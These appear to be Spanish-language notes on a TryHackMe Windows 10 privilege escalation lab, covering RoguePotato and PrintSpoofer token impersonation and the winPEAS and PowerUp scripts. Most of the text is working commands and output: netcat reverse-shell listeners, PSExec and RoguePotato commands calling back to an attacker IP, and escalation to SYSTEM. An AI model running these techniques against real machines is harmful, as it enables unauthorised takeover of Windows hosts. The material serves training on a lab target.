               2 Dir(s)  30,851,022,848 bytes free

C:\Users\user>

```

- Nos loqueamos rdesktop como admin, y el shell va a kali
```

> remina o xfree rdp


> Kali
┌──(kali㉿kali)-[~/tryhackme/windows10privesc]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.187.173] 49765
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>


```
## Task 16 Token Impersonation - Rogue Potato

- Conctamos rdp como admin / password 123 y vemos permisos
```

> la primera ves no

C:\Users\admin>whoami
win-qba94kb3iof\admin

C:\Users\admin>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\admin>


> pero lanzamos nueva shell especificando es como admomostrador

C:\Windows\system32>whoami
win-qba94kb3iof\admin

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled

SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled

SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

C:\Windows\system32>

SeTakeOwnershipPrivilege
```


- lazamos un reverse shell
```
> windows
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

> kali

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.7.204] 49808
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Windows\system32>



```

- Lanzamos desde ahi el rogue potato

```

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>C:\PrivEsc\RoguePotato.exe -r 10.6.13.236 -e "C:\PrivEsc\reverse.exe" -l 9999
C:\PrivEsc\RoguePotato.exe -r 10.6.13.236 -e "C:\PrivEsc\reverse.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] IStoragetrigger written:104 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\PrivEsc\reverse.exe
[+] RoguePotato gave you the SYSTEM powerz :D

C:\Windows\system32>whoami
whoami                                                                                
nt authority\local service 


>> otro kali antes de lanzar el potato

                                                                                      
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.7.204] 49912
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```
### Name one user privilege that allows this exploit to work.

SeImpersonatePrivilege 
### Name the other user privilege that allows this exploit to work.

 SeAssignPrimaryTokenPrivilege


- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- https://jlajara.gitlab.io/Potatoes_Windows_Privesc


## Task 17 Token Impersonation - PrintSpoofer

- corremos un shell para ser  nt autority\local
```
> windows

C:\Windows\system32>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

> kali

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.7.204] 49956
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>


```

- Iniciamos otro reverse para recibir
```
> windows

C:\Windows\system32>C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK




> kali

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 53
listening on [any] 53 ...
connect to [10.6.13.236] from (UNKNOWN) [10.10.7.204] 49973
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>



```
## Task 18 Privilege Escalation Scripts


### winPEAany.exe

```
C:\PrivEsc>winPEASany.exe
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list...
   - Creating disabled users list...
   - Admin users list...
```

### PowerUp.ps1

```
PS C:\Users\user> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\user>

PS C:\Users\user> Import-Module c:\\PrivEsc\\PowerUp.ps1
PS C:\Users\user>


PS C:\Users\user> Invoke-AllChecks

[*] Running Invoke-AllChecks


```

#### accesschk

https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk